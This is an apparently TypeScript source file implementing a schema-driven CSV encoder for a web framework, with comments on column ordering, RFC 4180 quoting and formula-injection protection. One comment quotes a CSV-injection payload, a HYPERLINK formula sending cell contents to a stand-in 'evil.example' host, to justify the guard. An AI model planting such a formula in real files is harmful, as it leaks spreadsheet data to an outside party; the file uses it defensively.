import { registerMediaEncoder, type JsonSchema } from '@erenthedeveloper0/zen'

/**
 * A CSV encoder for the `text/csv` representation — rfcs/0001 §13.4.
 *
 * This file is the whole argument for `registerMediaEncoder` being a seam
 * rather than a built-in, and it is worth reading before the routes.
 *
 * ### It is a factory, and that is the point
 *
 * `registerMediaEncoder` hands you the response schema — already converted to
 * JSON Schema, by the same probe the compiled serializer uses — and asks for a
 * *writer*. Everything schema-shaped happens once, at boot: the column list is
 * resolved, the header row is built, and the per-column formatters are chosen.
 * What runs per request appends strings.
 *
 * That is the same shape as §13.3's serializer compiler, deliberately. A CSV
 * encoder that read `Object.keys(row)` per row would produce a different
 * column order for a row with a missing optional field — which is not a
 * performance bug, it is a *correctness* bug that only appears on the row where
 * somebody's middle name is absent, and only in the file the finance team
 * opened three days later.
 *
 * ### It inherits the security property, for free
 *
 * The columns come from the schema, so a field the schema does not declare
 * cannot appear in the CSV, exactly as it cannot appear in the JSON (§13.3).
 * `internalMargin` is on every row this example produces and is in neither
 * representation. Nothing here had to remember that; the column list simply
 * never contained it.
 *
 * ### Why core does not ship this
 *
 * `@erenthedeveloper0/zen-core` has zero runtime dependencies and imports nothing from `node:`
 * (§19.8, B3). More to the point, there is no single right answer here: RFC
 * 4180 says `\r\n`, spreadsheets disagree about `sep=`, and whether a `null` is
 * an empty cell or the word `null` is a decision about somebody's downstream
 * pipeline. A framework that picked would be wrong for half its users and
 * unfixable for the other half.
 */

const encoder = (schema: JsonSchema | null): ((value: unknown) => string) => {
  const columns = columnsOf(schema)
  if (columns.length === 0) {
    // Refusing at boot rather than emitting an empty file. `ready()` turns this
    // into a diagnostic naming the route and the status (§12.7), which is a far
    // better failure than a 200 with zero bytes discovered by a cron job.
    throw new Error(
      'text/csv needs an object shape to take its columns from. ' +
      'Declare the response as an array of objects, or as an object with properties.',
    )
  }

  const header = columns.map(escapeCell).join(',')

  return (value) => {
    const rows = Array.isArray(value) ? (value as unknown[]) : [value]
    const out: string[] = [header]
    for (const row of rows) {
      const record = (row ?? {}) as Record<string, unknown>
      const cells: string[] = []
      for (let i = 0; i < columns.length; i++) {
        cells.push(escapeCell(format(record[columns[i] as string])))
      }
      out.push(cells.join(','))
    }
    return out.join('\r\n')
  }
}

registerMediaEncoder('text/csv', encoder)

/**
 * The declared columns, in declaration order.
 *
 * Reads either `{ type: 'array', items: { properties } }` — a report — or a
 * bare `{ properties }` — a single row. Anything else has no columns, which the
 * factory above turns into a boot error rather than a silent empty file.
 */
function columnsOf(schema: JsonSchema | null): readonly string[] {
  if (schema === null) return []
  const node = (schema['type'] === 'array' ? schema['items'] : schema) as JsonSchema | undefined
  const properties = node?.['properties'] as Record<string, unknown> | undefined
  return properties === undefined ? [] : Object.keys(properties)
}

/**
 * RFC 4180 quoting: a cell containing a comma, a quote or a newline is wrapped
 * in quotes and its quotes are doubled.
 *
 * The leading `=`, `+`, `-` and `@` guard is not RFC 4180 and is not cosmetic.
 * A spreadsheet treats a cell beginning with any of them as a *formula*, so a
 * note whose title is `=HYPERLINK("http://evil.example?"&A1)` executes when
 * somebody opens the export. It is CSV injection, it has a CVE history, and it
 * is the one thing a CSV writer must not leave to the caller — the caller
 * stored a string, and it was a string right up until the moment it was written
 * into a file with this extension.
 */
function escapeCell(value: string): string {
  const guarded = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value
  return /[",\r\n]/.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded
}

function format(value: unknown): string {
  if (value === null || value === undefined) return ''
  if (value instanceof Date) return value.toISOString()
  if (typeof value === 'object') return JSON.stringify(value)
  return String(value)
}
